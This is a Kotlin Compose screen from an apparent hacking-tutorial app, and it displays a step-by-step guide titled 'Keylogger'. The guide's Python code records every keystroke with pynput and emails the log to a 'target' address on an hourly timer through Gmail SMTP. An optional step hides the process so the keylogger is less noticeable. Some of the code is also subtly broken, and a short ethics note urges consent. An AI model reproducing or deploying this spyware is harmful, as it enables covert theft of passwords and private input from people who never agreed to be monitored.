package com.example.hackwithpython.projects

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Text
import androidx.compose.material3.Button
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.navigation.NavController

@Composable
fun Project3Screen(navController: NavController) {
    Column(
        modifier = Modifier
        .padding(16.dp)
        .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.Top,
        horizontalAlignment = Alignment.Start
    )
        {
        Text(
            text = "Project 3: Keylogger",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Project Introduction
        Text(
            text = """
                In this project, you will learn how to build a Python-based keylogger that captures keystrokes 
                and sends the logs to an email address. Keyloggers can be powerful tools in both legitimate and malicious uses, 
                but here, we'll focus on ethical usage for monitoring purposes.
                You will use Python libraries such as `pynput` to record keystrokes and `smtplib` to send logs via email.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Tools and Libraries Section
        Text(
            text = "Tools and Libraries",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                - **pynput**: A library that provides an interface to capture keyboard and mouse input.
                - **smtplib**: A built-in Python library used to send emails via the Simple Mail Transfer Protocol (SMTP).
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Steps Section
        Text(
            text = "Steps",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                1. **Install Required Libraries**:
                   Install `pynput` via pip.
                   ```bash
                   pip install pynput
                   ```

                2. **Recording Keystrokes**:
                   Use `pynput` to capture keystrokes.
                   ```python
                   from pynput.keyboard import Key, Listener

                   log = ""

                   def on_press(key):
                       global log
                       try:
                           log += str(key.char)
                       except AttributeError:
                           log += f" {str(key)} "
                       
                       # Save the log to a file
                       with open("keylog.txt", "w") as file:
                           file.write(log)

                   def on_release(key):
                       if key == Key.esc:
                           return False

                   with Listener(on_press=on_press, on_release=on_release) as listener:
                       listener.join()
                   ```

                3. **Sending Logs via Email**:
                   Use `smtplib` to send the captured keystrokes via email.
                   ```python
                   import smtplib
                   from email.mime.text import MIMEText

                   def send_email(log):
                       sender_email = "your_email@gmail.com"
                       receiver_email = "target_email@gmail.com"
                       password = "your_email_password"

                       message = MIMEText(log)
                       message["Subject"] = "Keylogger Report"
                       message["From"] = sender_email
                       message["To"] = receiver_email

                       with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                           server.login(sender_email, password)
                           server.sendmail(sender_email, receiver_email, message.as_string())

                   # Call the function to send the logs after capturing them
                   send_email(log)
                   ```

                4. **Automating Email Sending**:
                   Set a timer to automatically send the logs every few minutes.
                   ```python
                   import threading

                   def send_logs_periodically(log):
                       send_email(log)
                       # Set the timer to repeat every 60 minutes (3600 seconds)
                       timer = threading.Timer(3600, send_logs_periodically, [log])
                       timer.start()

                   # Start the timer
                   send_logs_periodically(log)
                   ```

                5. **Hiding the Keylogger Process** (Optional):
                   Hide the keylogger window to make it less noticeable.
                   ```python
                   import os

                   # Hide the console window on Windows
                   os.system("start /b pythonw keylogger.py")
                   ```

            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Ethical Considerations Section
        Text(
            text = "Ethical Considerations",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                It's important to use keyloggers responsibly and with permission from the target user. Unauthorized use of keyloggers can lead to legal consequences.
                Make sure that you are using the tool for ethical purposes, such as monitoring within legal boundaries or for educational demonstrations.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Conclusion
        Text(
            text = "Conclusion",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                In this project, you built a keylogger using Python, capable of capturing keystrokes and sending logs via email. 
                While this tool is powerful, it's essential to understand the ethical implications and only use it with explicit consent.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate back or to another project
        Button(onClick = { navController.navigate("project4") }) {
            Text(text = "Next Project")
        }
    }
}
